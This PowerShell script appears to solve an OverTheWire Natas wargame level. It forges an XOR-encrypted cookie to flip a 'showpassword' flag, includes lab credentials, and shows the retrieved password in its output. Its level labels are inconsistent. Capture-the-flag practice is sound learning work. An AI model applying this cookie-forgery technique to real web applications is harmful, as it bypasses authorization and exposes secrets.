
<#
Script to retrieve the password of level 9-10

#>
$url = "http://natas11.natas.labs.overthewire.org"
$creds = "natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK"
$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($creds))
$headers = @{ Authorization = "Basic $encodedCreds"}

#------------------------------------------------------------
 $a = (Invoke-WebRequest -uri $url -Method Post -Body $sec -proxy "http://localhost:8080" -Headers $headers).content 

# res  <form>
# Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
# </form>
# Output:
# <pre>
# </pre>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
#------------------------------------------------------------


# Get source
# --------------------------------------------------------------------------------
# $url += "/index-source.html"
# $a = (Invoke-WebRequest -uri $url -Method Get -proxy "http://localhost:8080" -Headers $headers).content 
# $clean = [System.Web.HttpUtility]::HtmlDecode($a).split("<br />")
# $clean




# $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

# function xor_encrypt($in) {
#     $key = '<censored>';
#     $text = $in;
#     $outText = '';

#     // Iterate through each character
#     for($i=0;$i<strlen($text);$i++) {
#     $outText .= $text[$i] ^ $key[$i % strlen($key)];
#     }

#     return $outText;
# }

# function loadData($def) {
#     global $_COOKIE;
#     $mydata = $def;
#     if(array_key_exists("data", $_COOKIE)) {
#     $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
#     if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
#         if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
#         $mydata['showpassword'] = $tempdata['showpassword'];
#         $mydata['bgcolor'] = $tempdata['bgcolor'];
#         }
#     }
#     }
#     return $mydata;
# }

# function saveData($d) {
#     setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
# }

# $data = loadData($defaultdata);

# if(array_key_exists("bgcolor",$_REQUEST)) {
#     if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
#         $data['bgcolor'] = $_REQUEST['bgcolor'];
#     }
# }

# saveData($data);



# ?>


# --------------------------------------------------------------------------------



# Observation:
# we submit a cookie name data with 2 props: showpassword & bgcolor (showpassword, yes)
# $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff"); example cookie
# $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true); encription routine
# array( "showpassword"=>"abcdef", "bgcolor"=>"#ffffff"); example cookie

# We dont have the key;
# since xor is the enc, we can send a bogus cookie, have it encryted so we can brute it


#========That was not needed because The server handles encription. We just send it the cookie we wish
#-----------------------------------------------------------------------------------

# $s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
# $show = New-Object System.Net.Cookie("showpassword", 'yes', "/", "natas11.natas.labs.overthewire.org")
# $col = New-Object System.Net.Cookie("bgcolor", 'ffffff', "/", "natas11.natas.labs.overthewire.org")

# $s.Cookies.Add($show)
# $s.Cookies.Add($col)
# echo $s.Cookies.GetCookies("http://natas11.natas.labs.overthewire.org")[1].value


# ------------------------------------------------------------------------------------
# #We are going to cheat here
# strong hand weaving... check our python scripts for logic

$cook = "ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"

$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$cook = New-Object System.Net.Cookie("data",$cook ,"/", "natas11.natas.labs.overthewire.org")
$s.Cookies.Add($cook)



$a = (Invoke-WebRequest -uri $url -Method Post -Body $parms -proxy "http://localhost:8080" -Headers $headers -WebSession $s).content 
$passwd = ($a | select-string -AllMatches "(\w{20,})").matches[1]


echo "The password for natas10 is $passwd"

# $passwd = ($a | select-string -AllMatches "(\w{20,})").matches[1]
# echo "The password for natas10 is $passwd"



# PS /home/voltron/OTW/natas/pshell_lang>  ./natas12.ps1                          
# The password for natas10 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3                    
# PS /home/voltron/OTW/natas/pshell_lang> 


# https://www.leeholmes.com/blog/2018/04/09/xor-is-not-as-fancy-as-malware-authors-think/